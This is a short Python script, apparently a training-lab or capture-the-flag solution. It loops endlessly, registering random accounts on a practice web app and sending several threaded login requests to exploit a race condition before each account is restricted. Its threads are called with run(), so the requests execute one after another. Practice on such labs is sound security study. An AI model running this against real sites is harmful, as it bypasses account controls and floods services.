import requests
import string
import random
from threading import Thread
import time


URL = "http://aart.training.jinblack.it"

def registration(s, u, p):
    url = "%s/register.php" % (URL,)
    payload = {'username': u, 'password': p}
    r = s.post(url, data=payload)
    return r.text


def login(s, u, p):
    url = "%s/login.php" % (URL,)
    payload = {'username': u, 'password': p}
    r = s.post(url, data=payload)
    if "This is a restricted account" not in r.text:
        print(r.text)
    return r.text


def randomString(N=10):
    return  ''.join(random.choice(string.ascii_lowercase + string.digits) for i in range(N))#''.join(random.choices(string.ascii_uppercase + string.digits, k=N))


while True:
    u = randomString()
    p = u
    print(u, p)
    s = requests.Session()
    t_logins = []
    t_reg = Thread(target=registration, args=[s,u,p])
    #t_login = Thread(target=login, args=[s,u,p])
    for i in range(6):
         t_logins.append(Thread(target=login, args=[s,u,p]))
    t_reg.run()
    for i in range(6):
    	t_logins[i].run()
    #time.sleep(0.1)
